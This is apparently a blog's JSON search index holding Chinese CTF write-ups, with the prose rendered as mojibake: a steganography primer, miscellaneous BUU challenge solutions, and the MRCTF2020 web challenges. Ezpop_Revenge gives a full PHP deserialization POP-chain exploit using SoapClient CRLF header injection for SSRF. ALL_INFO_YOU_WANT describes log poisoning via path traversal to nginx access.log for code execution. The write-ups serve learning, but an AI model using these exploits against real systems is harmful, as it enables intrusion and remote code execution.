ä¸€èˆ¬åœ¨é¢˜ç›®ä¸­ä¼šæ’å…¥ä¸€äº›å›¾ç‰‡ï¼Œç”±äºä¸€ä¸‹å°±é—ªè¿‡äº†æ‰€ä»¥éœ€è¦ç”¨è¿™ä¸ªå·¥å…·æŒ‰å¸§æå–å‡ºæ¥ï¼Œç®€å•çš„é¢˜ç›®å¾€å¾€è¿™æ ·å°±èƒ½åšå‡ºæ¥äº†ã€‚ æ–‡æœ¬éšå†™1.wordæ–‡æ¡£éšå†™ç™½è‰²æ–‡å­— ç”±äºä¸€èˆ¬wordæ–‡æ¡£éƒ½æ˜¯ç™½è‰²ä¸ºåº•è‰²ï¼Œæ‰€ä»¥å¦‚æœæ–‡æœ¬å­—ä½“è®¾ç½®çš„æ˜¯ç™½è‰²ï¼Œå°±çœ‹ä¸å‡ºæ¥æœ‰ä¸œè¥¿ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è¯•è¯•ctrl+aï¼Œå…¨é€‰æ–‡å­— å†æŠŠé¢œè‰²æ”¹æˆå…¶ä»–é¢œè‰²ï¼Œå°±èƒ½çœ‹å‡ºæ¥è¢«éšè—çš„æ–‡å­—äº† éšè—æ–‡å­—é€‰é¡¹ åœ¨æ–‡æœ¬å‡ºå³é”®é¼ æ ‡ï¼Œå­—ä½“é€‰é¡¹ä¸­æœ‰ä¸€å¤„éšè—æ–‡å­—é€‰é¡¹å–æ¶ˆå‹¾é€‰åè¢«éšè—çš„æ–‡å­—å°±å‡ºç°äº† 2.PDFéšå†™wbs43openï¼ˆå¯ç”¨äºPDFã€bmpç­‰æ–‡ä»¶çš„éšå†™ï¼‰ ç‚¹å‡»continueåä¼šå‡ºç°encodeå’Œdecodeï¼Œè§£å¯†å°±é€‰decodeï¼Œç„¶åç¬¬ä¸‰æ­¥å°±é€‰æ‹©æ–‡ä»¶ç±»å‹å’Œæ–‡ä»¶ ç¬¬å››æ­¥æ­¥è®¾ç½®å¯†ç ï¼Œå¯ä»¥ç½®ç©º ç¬¬äº”æ­¥è®¾ç½®è§£å¯†ä¹‹åæ–‡ä»¶çš„å­˜å‚¨è·¯å¾„åŠæ–‡ä»¶å æ¥ä¸‹æ¥ç¬¬å…­æ­¥å®Œæˆå°±è¡Œå•¦ è¦å‡ºè¿™ç§ç±»å‹çš„éšå†™é¢˜åŒæ ·ç”¨è¿™ä¸ªå·¥å…·ä¹Ÿè¡Œã€‚ 3.htmléšå†™å³snowéšå†™ï¼Œéœ€è¦å‘Šè¯‰keyï¼Œè§£å¯†ç½‘ç«™http://fog.misty.com/perry/ccs/snow/snow/snow.html å…¶ä»–ç±»å‹çš„éšå†™1.base64éšå†™Tr0yå¸ˆå‚…çš„æ–‡ç« è®²è§£çš„å¾ˆè¯¦ç»†ï¼Œåœ¨è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œè¯·ç§»æ­¥https://www.tr0y.wang/2017/06/14/Base64steg/ 2.é›¶å®½åº¦å­—ç¬¦éšå†™é›¶å®½åº¦å­—ç¬¦æ˜¯ä¸€äº›ä¸å¯è§çš„ï¼Œä¸å¯æ‰“å°çš„å­—ç¬¦ã€‚æœ¬æ–‡ä¸åšæ›´å¤šä»‹ç»ï¼Œæ›´è¯¦ç»†çš„å†…å®¹è¯·ç§»æ­¥http://www.ga1axy.top/index.php/archives/20/ 3.ntfsæ•°æ®æµéšå†™ NTFSï¼ˆNew Technology File Systemï¼‰æ˜¯Windows NTå†…æ ¸çš„ç³»åˆ—æ“ä½œç³»ç»Ÿæ”¯æŒçš„ã€ä¸€ä¸ªç‰¹åˆ«ä¸ºç½‘ç»œå’Œç£ç›˜é…é¢ã€æ–‡ä»¶åŠ å¯†ç­‰ç®¡ç†å®‰å…¨ç‰¹æ€§è®¾è®¡çš„ç£ç›˜æ ¼å¼ï¼Œæä¾›é•¿æ–‡ä»¶åã€æ•°æ®ä¿æŠ¤å’Œæ¢å¤ï¼Œèƒ½é€šè¿‡ç›®å½•å’Œæ–‡ä»¶è®¸å¯å®ç°å®‰å…¨æ€§ï¼Œå¹¶æ”¯æŒè·¨è¶Šåˆ†åŒºã€‚ â€“ã€Šç™¾åº¦ç™¾ç§‘ã€‹ echo abcdefg&gt;&gt;123.txt:222.txt è¯¥æ¡å‘½ä»¤åˆ›å»ºçš„æ˜¯å•ç‹¬çš„NTFSæµæ–‡ä»¶ï¼Œç³»ç»Ÿä¸å¯è§çš„åŒæ—¶æˆ‘ä»¬æ— æ³•é€šè¿‡æ™®é€šæ–¹æ³•çœ‹åˆ° æ­¤æ—¶æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯å‘½ä»¤ï¼š notepad 123.txt:222.txt //è¿™ä¸ªå‘½ä»¤åªæœ‰è‡ªå·±å·²ç»çŸ¥é“NTFSæµæ–‡ä»¶åçš„æ—¶å€™ä½¿ç”¨ï¼Œå±€é™æ€§å¾ˆå¤§ï¼ŒåŒæ—¶å¤±è´¥å‡ ç‡å¤§ å¦ä¸€ç§æ–¹æ³•æ˜¯ç”¨å·¥å…·ï¼šNtfsStreamsEditorï¼ˆå³é”®ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼‰ ç‚¹å‡»å¿«é€ŸæŸ¥çœ‹ åŸæ–‡é“¾æ¥:https://www.freebuf.com/articles/others-articles/266884.html","link":"/2021/10/09/misc%E5%85%A5%E9%97%A8/"},{"title":"MRCTF2020","text":"[MRCTF2020]Ezpop_Revengewww.zipæºç æ³„éœ²ï¼Œä¸‹è½½ä¸‹æ¥å®¡è®¡ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªflag.phpï¼Œçœ‹èµ·æ¥æ˜¯éœ€è¦SSRFæ¼æ´çš„å› ä¸ºéœ€è¦ä½ è®¿é—®çš„æ¥æºæ˜¯127.0.0.1 &lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){ $_SESSION['flag']= &quot;MRCTF{******}&quot;;}else echo &quot;æˆ‘æ‰Œyour problem?\\nonly localhost can get flag!&quot;;?&gt; æ¯•ç«Ÿæ˜¯æ¡†æ¶é¢˜ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯è¦ååºåˆ—åŒ–æ‰¾ssrfçš„æ¼æ´çš„ä½ç‚¹ç„¶åå»æ‰“ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹ååºåˆ—åŒ–å‡½æ•°ï¼Œå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬ä¼ å…¥çš„coincidence[â€˜helloâ€™], $this-&gt;coincidence[â€˜worldâ€™]ä¼šè¢«åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ä¼ å…¥Typecho_Db &lt;?phpclass HelloWorld_DB{ private $flag=&quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); }}class HelloWorld_Plugin implements Typecho_Plugin_Interface{public function action(){ if(!isset($_SESSION)) session_start(); if(isset($_REQUEST['admin'])) var_dump($_SESSION); if (isset($_POST['C0incid3nc3'])) { if(preg_match(&quot;/file|assert|eval|[`\\'~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo &quot;Not that easy.&quot;; } } } } ?&gt; ä¼ å…¥ä¹‹åï¼Œåœ¨è¿™é‡Œè¿›è¡Œè¿›è¡Œäº†ä¸€ä¸ªæ‹¼æ¥,å¹¶åœ¨æœ€åå®ä¾‹åŒ–äº†è¿™ä¸ªç±»,å¯ä»¥çœ‹åˆ°è¿™é‡Œæç¤ºäº†ä¸€ä¸ªtostringæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å»æ‰¾æ‰¾Typecho_Dbï¼Œçœ‹çœ‹æ˜¯å¦æœ‰è¿™ä¸ªtostringæ–¹æ³•ï¼Œå¯ä»¥è¿›è¡Œæ“ä½œ public function __construct($adapterName, $prefix = 'typecho_') { /** è·å–é€‚é…å™¨åç§° */ $this-&gt;_adapterName = $adapterName; /** æ•°æ®åº“é€‚é…å™¨ */ $adapterName = 'Typecho_Db_Adapter_' . $adapterName; if (!call_user_func(array($adapterName, 'isAvailable'))) { throw new Typecho_Db_Exception(&quot;Adapter {$adapterName} is not available&quot;);//__toString() } $this-&gt;_prefix = $prefix; /** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡ $this-&gt;_adapter = new $adapterName(); } å¯ä»¥å‘ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªtostringæ–¹æ³•å¯ä»¥è¿›è¡Œæ“ä½œï¼Œå…¶å®é“¾å­åˆ°è¿™é‡Œå°±ä¼¼ä¹å·²ç»æ–­äº†ï¼Œä½†æ˜¯è¯¥å¦‚ä½•å®ç°ssrfå‘¢ï¼Ÿå°±è¦æƒ³åˆ°ä¸€ä¸ªphpçš„å†…ç½®ç±»soapclientï¼Œè€Œè¿™é‡Œæœ‰ä¸ªç‚¹ï¼Œ_adapter-&gt;parseSelectï¼Œå¦‚æœå°†adapterèµ‹å€¼ä¸ºè¿™ä¸ªç±»ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨è¿™ä¸ªç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œç›¸å½“äºè§¦å‘äº†å…¶ä¸­çš„callå‡½æ•°ï¼Œå¹¶ä¸”è¿™é‡Œè¿˜æœ‰å¯æ§çš„å‚æ•°ä¾›æˆ‘ä»¬å†™å…¥ class Typecho_Db_Query{ const KEYWORDS = '*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'; private static $_default = array( 'action' =&gt; NULL, 'table' =&gt; NULL, 'fields' =&gt; '*', 'join' =&gt; array(), 'where' =&gt; NULL, 'limit' =&gt; NULL, 'offset' =&gt; NULL, 'order' =&gt; NULL, 'group' =&gt; NULL, 'having' =&gt; NULL, 'rows' =&gt; array(), ); private $_adapter; private $_sqlPreBuild; private $_prefix; private $_params = array(); public function __toString() { switch ($this-&gt;_sqlPreBuild['action']) { case Typecho_Db::SELECT: return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild); case Typecho_Db::INSERT: return 'INSERT INTO ' . $this-&gt;_sqlPreBuild['table'] . '(' . implode(' , ', array_keys($this-&gt;_sqlPreBuild['rows'])) . ')' . ' VALUES ' . '(' . implode(' , ', array_values($this-&gt;_sqlPreBuild['rows'])) . ')' . $this-&gt;_sqlPreBuild['limit']; case Typecho_Db::DELETE: return 'DELETE FROM ' . $this-&gt;_sqlPreBuild['table'] . $this-&gt;_sqlPreBuild['where']; case Typecho_Db::UPDATE: $columns = array(); if (isset($this-&gt;_sqlPreBuild['rows'])) { foreach ($this-&gt;_sqlPreBuild['rows'] as $key =&gt; $val) { $columns[] = &quot;$key = $val&quot;; } } return 'UPDATE ' . $this-&gt;_sqlPreBuild['table'] . ' SET ' . implode(' , ', $columns) . $this-&gt;_sqlPreBuild['where']; default: return NULL; } } æ¢³ç†ä¸€ä¸‹popé“¾çš„é€»è¾‘1.HelloWorld_Pluginä¸ºpopé“¾ååºåˆ—åŒ–çš„å…¥å£ï¼Œè·³è½¬è‡³HelloWorld_DBç±»ä¸­è¿›è¡ŒTypecho_Dbè¿›è¡Œä¸€ä¸ªåˆå§‹åŒ–ï¼Œå¹¶é€šè¿‡concidenceä¼ å…¥æ•°å€¼2.é€šè¿‡tostringè·³è½¬è‡³Typecho_Dbçš„tostringé­”æœ¯æ–¹æ³•ä¸­3.é’ˆå¯¹adatpterçš„ä¸€ä¸ªè°ƒç”¨èµ‹å€¼ä¸ºsopaç±»å¹¶è¿›è¡Œsopaç±»çš„callæ–¹æ³•çš„è°ƒç”¨ï¼Œæœ€ååˆ©ç”¨è¿™ä¸ªcallæ–¹æ³•è¿›è¡Œä¸€ä¸ªssrfå‘é€æŠ¥æ–‡å®ç°flagçš„è·å– æ‰€ä»¥åˆæ­¥çš„ä¸€ä¸ªpopé“¾å°±æ˜¯ &lt;?phpclass HelloWorld_DB{ private $flag = &quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __construct() { $this-&gt;coincidence=array(&quot;hello&quot;=&gt;new Typecho_Db_Query()); }}class Typecho_Db_Query{ function __construct() { $this-&gt;_adapter = new SoapClient(); $this-&gt;_sqlPreBuild=array(&quot;action&quot;=&gt;&quot;SELECT&quot;); $this-&gt;_adapter=new SoapClient; }} ä½†æ˜¯æˆ‘ä»¬è¦å°†flagå¸¦å‡ºæ¥ï¼Œè¿˜éœ€è¦å§è‡ªå·±çš„phpsessidä¼ è¿‡æ¥ï¼Œç„¶è€Œsoapå¹¶ä¸èƒ½è®¾ç½®cookieï¼Œå› æ­¤éœ€è¦crlfï¼Œsoapclientå¯ä»¥è¿™åªuaï¼Œåªè¦åœ¨uaååŠ ä¸Š\\r\\nCookieï¼šPHPSESSID=xxx,å°±å¯ä»¥ä¸ºhttpå¤´æ·»åŠ ä¸€ä¸ªæ–°çš„cookieå­—æ®µï¼Œè¿™æ ·å°±å¯ä»¥å¸¦å‡ºsessionäº†ï¼Œæœ€åå°±æ˜¯å¯»æ‰¾ä¸€ä¸‹å…¶ä¸­çš„è·¯ç”±å³å¯ï¼Œåœ¨/var/Typecho/Plugin.php å°±æœ‰å¦‚ä¸‹è·¯ç”± */public static function activate($pluginName){ self::$_plugins['activated'][$pluginName] = self::$_tmp; self::$_tmp = array(); Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,'action');} ä½†æ˜¯åœ¨åé¢çœ‹äº†é¢˜è§£ï¼Œå‘ç°è¿™é¢˜æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯è¿™é‡Œprivateå±æ€§ä¸èƒ½å•çº¯çš„ä½¿ç”¨%00ç»•è¿‡éœ€è¦å°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶æ‰è¡Œæ‰€ä»¥æœ€ç»ˆçš„è„šæœ¬å¦‚ä¸‹: &lt;?phpclass HelloWorld_DB{ private $flag = &quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __construct() { $this-&gt;coincidence=array(&quot;hello&quot;=&gt;new Typecho_Db_Query()); }}class Typecho_Db_Query{ private $_adapter; private $_sqlPreBuild; function __construct() { $target = &quot;http://127.0.0.1/flag.php&quot;; $post_string = ''; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=abcd' ); $a = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;&quot;eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n&quot;.join(&quot;\\r\\n&quot;,$headers).&quot;\\r\\nContent-Length: &quot;.(string)strlen($post_string).&quot;\\r\\n\\r\\n&quot;.$post_string, 'uri' =&gt; &quot;aaab&quot;)); $this-&gt;_adapter = $a; $this-&gt;_sqlPreBuild=array(&quot;action&quot;=&gt;&quot;SELECT&quot;); }}function decorate($str){ $arr = explode(':', $str); $newstr = ''; for ($i = 0; $i &lt; count($arr); $i++) { if (preg_match('/00/', $arr[$i])) { $arr[$i - 2] = preg_replace('/s/', &quot;S&quot;, $arr[$i - 2]); } } $i = 0; for (; $i &lt; count($arr) - 1; $i++) { $newstr .= $arr[$i]; $newstr .= &quot;:&quot;; } $newstr .= $arr[$i]; return $newstr;}$a = new HelloWorld_DB();$a = preg_replace(&quot; /\\^\\^/&quot;, &quot;\\r\\n&quot;, $a);$urlen = urlencode($a);$urlen = preg_replace('/%00/', '%5c%30%30', $urlen);$a = decorate(urldecode($urlen));echo base64_encode($a); ä½†æ˜¯å¾ˆå¥‡æ€ªï¼Œç”¨è¿™ä¸ªç”Ÿæˆçš„payloadæ‰“ä¸é€šï¼Œäºæ˜¯æˆ‘ä»¬æ¥æ¯”å¯¹çœ‹çœ‹æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜,æµ‹è¯•äº†ä¸€ä¸‹ï¼ŒåŸæ¥é—®é¢˜å‡ºåœ¨httpå¤´çš„ä¹¦å†™è¿‡ç¨‹ä¸­ $target = &quot;http://127.0.0.1/flag.php&quot;; $post_string = ''; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=abcd' ); $a = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;&quot;eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n&quot;.join(&quot;\\r\\n&quot;,$headers).&quot;\\r\\nContent-Length: &quot;.(string)strlen($post_string).&quot;\\r\\n\\r\\n&quot;.$post_string, 'uri' =&gt; &quot;aaab&quot;)); $this-&gt;_adapter = $a; ALL_INFO_YOU_WANTè¿™ç§è§£æ³•æ¯”è¾ƒç­¾åˆ°ï¼Œæ˜¯å¸¸è§„æ€è·¯ï¼Œè¿™é¢˜çš„å®šä½æœ¬æ¥å°±æ˜¯ä¸ªç™½ç»™çš„é¢˜ç›®ï¼Œæ‰€ä»¥å°±æ²¡æ”¹æ‰æ—¥å¿— ç”± http å›åŒ… header å¾—çŸ¥æ˜¯ NGINXï¼Œç›´æ¥ï¼š all_info_u_want.php?file=../../../../../var/log/nginx/access.log ä½†æ˜¯å› ä¸º url ä¼šè¢« url ç¼–ç ï¼Œå¯ä»¥æŠŠä¸€å¥è¯æœ¨é©¬å†™åœ¨ User-Agentï¼Œå¦å¤–è®°å¾—ä¸€å®šè¦é—­åˆä¸ç„¶ php æ‰§è¡Œä¼šå‡ºé”™ï¼ŒåŒ…å«å³å¯ RCEæ‰¾flagæ–°è¯­å¥ï¼šé€šè¿‡æ–‡ä»¶å†…å®¹æ‰¾flag find / -name &quot;*&quot; | xargs grep &quot;flag{&quot;","link":"/2021/10/10/MRCTF2020/"},{"title":"jspå†…å­˜é©¬","text":"","link":"/2021/10/10/jsp%E5%86%85%E5%AD%98%E5%90%97/"},{"title":"ç”µå­å–è¯","text":"","link":"/2021/10/09/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"},{"title":"NSSCTF-pharååºåˆ—åŒ–","text":"","link":"/2021/10/13/NSSCTF-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"buu-misc","text":"å¿˜è®°ä¿å­˜äº†ï¼Œæ— è¯­äº†ï¼Œæ‰€ä»¥ç›´æ¥å†™ä¸€ä¸‹è§£é¢˜æ€è·¯ é‡‘ä¸‰èƒ–é€‰æ‹©analyzeçš„frame browser äºŒç»´ç binwalk -e 1.png åªç”¨zipå¯†ç çˆ†ç ´è½¯ä»¶ Nç§æ–¹å¼è§£å†³åœ¨ç½‘é¡µä¸­æ‰“å¼€ï¼ˆå†™ä¸ªhtmlä»£ç ï¼‰ å¤§ç™½å¾ˆæ˜¾ç„¶å•Š å›¾ç‰‡é•¿å®½ä¸å¯¹åœ¨010ä¸­æ‰“å¼€ è°ƒæ•´é•¿é«˜18ã€19ä½æ˜¯é•¿ï¼Œ22ã€23æ˜¯å®½ ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°010ä¸­æ‰“å¼€ æœç´¢flag æˆ–æ‹‰åˆ°åº• åŸºç¡€ç ´è§£ rarä½¿ç”¨rarç ´è§£å·¥å…· LSBçœ‹åˆ°RGBä¸­çš„0é€šé“ä¸Šé¢æœ‰ä¸€è¡Œå†…å®¹ å…ˆé€‰æ‹©analyse -&gt;data extract-&gt;save binä¿å­˜ä¸ºpng æ‰«æä¸€ä¸‹ æ–‡ä»¶ä¸­çš„ç§˜å¯†è®°äº‹æœ¬æ‰“å¼€ï¼ˆæ”¹åç¼€ï¼‰ zipä¼ªåŠ å¯†å°±æ˜¯è¿™ä¸ªzip zipä¼ªåŠ å¯†æ˜¯åœ¨æ–‡ä»¶å¤´çš„åŠ å¯†æ ‡å¿—ä½åšä¿®æ”¹ï¼Œè¿›è€Œå†æ‰“å¼€æ–‡ä»¶æ—¶è¯†è¢«åˆ«ä¸ºåŠ å¯†å‹ç¼©åŒ… ä¸€ä¸ª ZIP æ–‡ä»¶ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿— å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š 50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰ 14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ 00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰ 08 00ï¼šå‹ç¼©æ–¹å¼ 5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ 16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ 19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ 17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ 07 00ï¼šæ–‡ä»¶åé•¿åº¦ 00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦ å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š 50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50) 3F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬ 14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ 00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º09 00æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰ 08 00ï¼šå‹ç¼©æ–¹å¼ 5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ 16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ 19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ 17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ 07 00ï¼šæ–‡ä»¶åé•¿åº¦ 24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦ 00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦ 00 00ï¼šç£ç›˜å¼€å§‹å· 00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§ 20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§ 00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡ å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š 50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®° 00 00ï¼šå½“å‰ç£ç›˜ç¼–å· 00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å· 01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•° 01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•° 59 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å° 3E 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡ 00 00ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦ å› æ­¤ï¼Œæ ¹æ®æ­¤é¢˜ç›®æ¥çœ‹ï¼š å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ç„¶åæˆ‘ä»¬ç›´æ¥æœç´¢åŠ å¯†æ–¹å¼0900 è¯´æ˜æ˜¯æœ‰åŠ å¯†ï¼Œ0800è¯´æ˜æ— åŠ å¯† æ¥ä¸‹æ¥ä½¿ç”¨å…¶ä»–è§£å‹è½¯ä»¶æ‰“å¼€å°±è¡Œäº†ï¼Œè¿™é‡Œç”¨å¾—æ˜¯winrar è¢«å—…æ¢çš„æµé‡ç›´æ¥æœç´¢flagå°±è¡Œäº† é•œå­é‡Œçš„ä¸–ç•Œä½¿ç”¨stegslove æ‰“å¼€ï¼Œç‚¹å‡»extract previewåŠŸèƒ½ï¼Œé€‰å–æœ€ä½0é€šé“ï¼Œæ‰“å¼€å³å¯çœ‹åˆ°flag ningenåœ¨010editorä¸­å‘ç°ä¿¡æ¯ ä½¿ç”¨åˆ†ç¦»å·¥å…·åˆ†ç¦»ä¸€ä¸‹ç„¶åzipå¯†ç çˆ†ç ´ä¸€ä¸‹ å°æ˜çš„ä¿é™©ç®± åº”è¯¥åˆæ˜¯è¦åˆ†ç¦»ä¸€ä¸‹æ–‡ä»¶ï¼Œåˆ†ç¦» ä»¥åéœ€è¦å¯†ç ï¼Œå†å›å»çœ‹ å‘ç°010editoræœ‰è¯´ escape capè¿½è¸ªtcpæµå³å¯ å¦ä¸€ä¸ªä¸–ç•Œæ–‡ä»¶å°¾å·´ï¼Œç„¶åäºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²å³å¯z éšè—çš„é’¥åŒ™å›¾ç‰‡éšå†™ ä½¿ç”¨010æ‰“å¼€ï¼Œç›´æ¥ç‚¹å‡»æœç´¢ç±»å‹â€”â€”textï¼Œç„¶åç‚¹å‡»æœç´¢flagå³å¯ FLAGstegæ‰“å¼€ï¼Œä½¿ç”¨binä¿å­˜ï¼Œç„¶åä¿å­˜ä¸ºzipï¼Œè§£å‹ä»¥åå¾—åˆ°çš„æ–‡ä»¶ï¼Œä½¿ç”¨010æ‰“å¼€ï¼Œç„¶åæœç´¢{å°±å¯ä»¥æ‰¾åˆ°flagè¿™é‡Œè¯´ä¸€ä¸‹æ€è·¯æ„Ÿè§‰æ²¡æœ‰æç¤ºï¼Œå•çº¯è®©ä½ å°±æ˜¯ç¡¬è¯•ï¼Ÿæ‰€ä»¥å°ç»“ä¸€ä¸‹ å°ç»“é‡åˆ°å›¾ç‰‡â€”â€”010editoræ‰“å¼€è¯•è¯•ï¼Œå…¨å±€æœç´¢flagã€txtã€zipç­‰æ–‡ä»¶ï¼Œå¦‚æœæœ‰ï¼Œå°±å»åˆ†ç¦»ï¼Œæ²¡æœ‰çš„è¯å°±è€ƒè™‘æ˜¯å¦éšè—åœ¨LSBä¸­ï¼Œæ‰€ä»¥åˆ†ç¦»0é€šé“å¯¼å‡ºä¸ºbinï¼Œç„¶åå°è¯•ï¼Œä¹Ÿè®¸æ˜¯jpgï¼Œä¹Ÿè®¸æ˜¯txtï¼Œä¹Ÿè®¸æ˜¯zipï¼Œä¸»è¦çœ‹æ–‡ä»¶å¤´ï¼Œåƒè¿™é¢˜504b0304æ˜æ˜¾æ˜¯zipçš„æ–‡ä»¶å¤´ï¼Œæ‰€ä»¥ä¿å­˜ä¸ºzip å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜ ä¸‹é¢åº”è¯¥æ˜¯å‹ç¼©åŒ…çš„å¯†ç ï¼Œä½†æ˜¯æ²¡çœ‹æ‡‚æ˜¯å¹²ä¸ªå•¥ åŸæ¥æ˜¯ç›²æ–‡è¡¨ã€‚ã€‚ã€‚å¯¹ç…§ä¸€ä¸‹: kmdonowg å¾—åˆ°äº†ä¸€ä¸ªéŸ³é¢‘ï¼Œå¬èµ·æ¥å°±æ˜¯ä¸ªè«æ–¯ç”µç  -.-. - â€¦-. .-- .â€“. . â€¦ ----- â€”â€¦ --â€¦ â€¦-- â€¦â€” â€¦â€“â€¦ â€¦â€” â€¦-- -â€¦ --â€¦ flag{wpei08732?23dz} ç¥ç§˜é¾™å·é£çˆ†ç ´ä¸€ä¸‹https://www.splitbrain.org/services/ookbrainfuckåŠ å¯†ï¼Œè§£å¯†ä¸€ä¸‹: åé—¨æŸ¥æ€è¦æˆ‘ä»¬æ‰¾webshellæ–‡ä»¶ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨linuxç³»ç»Ÿçš„æŸ¥æ‰¾æ–‡ä»¶å†…å®¹æŒ‡ä»¤ï¼Œæˆ–è€…ä½¿ç”¨Dç›¾ï¼Œè¿™é‡Œè¯•ä¸€ä¸‹Dç›¾ï¼Œå› ä¸ºDç›¾åç»­è¿˜å¯ç”¨äºawdæŸ¥æ‰¾shellæ–‡ä»¶ æ•°æ®åŒ…ä¸­çš„çº¿ç´¢åœ¨æµé‡åŒ…ä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¾ˆé•¿çš„ä¸œè¥¿ï¼Œæ„Ÿè§‰æ˜¯æœ‰é—®é¢˜çš„base64è§£ç ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªJFIFæ–‡ä»¶ æ­¤ç½‘ç«™è§£ç å¯ä»¥ç›´æ¥è½¬æˆæ–‡ä»¶https://the-x.cn/base64 